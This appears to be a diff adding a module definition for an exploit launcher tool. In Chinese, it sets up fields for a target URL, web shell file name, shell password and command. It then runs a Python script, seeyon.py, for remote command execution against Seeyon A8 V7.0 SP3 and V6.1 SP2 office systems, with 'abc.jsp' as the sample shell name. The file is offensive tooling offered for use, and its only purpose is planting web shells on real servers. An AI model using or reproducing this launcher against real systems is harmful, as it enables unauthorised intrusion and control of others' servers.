@@ -1,0 +1,18 @@
+<sfjt>inject</sfjt>
+<cs1mc>目标网址</cs1mc>
+<cs2mc>Shell文件名</cs2mc>
+<cs3mc>Shell密码</cs3mc>
+<cs4mc>Command</cs4mc>
+
+<zbz>1</zbz>
+<bz1>
+<cmd>python seeyon.py "<cs1/>" "<cs2/>" "<cs4/>" "<cs3/>"</cmd>
+</bz1>
+
+<bz>A8 V7.0 SP3
+A8 V6.1 SP2
+
+远程命令执行
+
+目标网址例：http://www.xxxx.xxx
+Shell文件名例：abc.jsp</bz>
